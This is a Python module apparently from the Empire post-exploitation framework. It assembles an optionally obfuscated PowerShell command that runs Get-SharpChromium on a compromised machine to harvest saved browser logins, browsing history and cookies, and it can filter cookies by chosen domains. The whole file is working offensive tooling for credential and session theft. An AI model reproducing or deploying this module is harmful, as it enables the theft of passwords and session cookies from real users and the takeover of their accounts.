from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # read in the common module source code
        script, err = main_menu.modules.get_module_source(module_name=module.script_path, obfuscate=obfuscate, obfuscate_command=obfuscation_command)
        
        if err:
            return handle_error_message(err)

        script_end = " Get-SharpChromium"

        #check type
        if params['Type'].lower() not in ['all','logins','history','cookies']:
            print(helpers.color("[!] Invalid value of Type, use default value: all"))
            params['Type']='all'
        script_end += " -Type "+params['Type']
        #check domain
        if params['Domains'].lower() != '':
            if params['Type'].lower() != 'cookies':
                print(helpers.color("[!] Domains can only be used with Type cookies"))
            else:
                script_end += " -Domains ("
                for domain in params['Domains'].split(','):
                    script_end += "'" + domain + "',"
                script_end = script_end[:-1]
                script_end += ")"

        outputf = params.get("OutputFunction", "Out-String")
        script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'

        script = main_menu.modules.finalize_module(script=script, script_end=script_end, obfuscate=obfuscate, obfuscation_command=obfuscation_command)
        return script
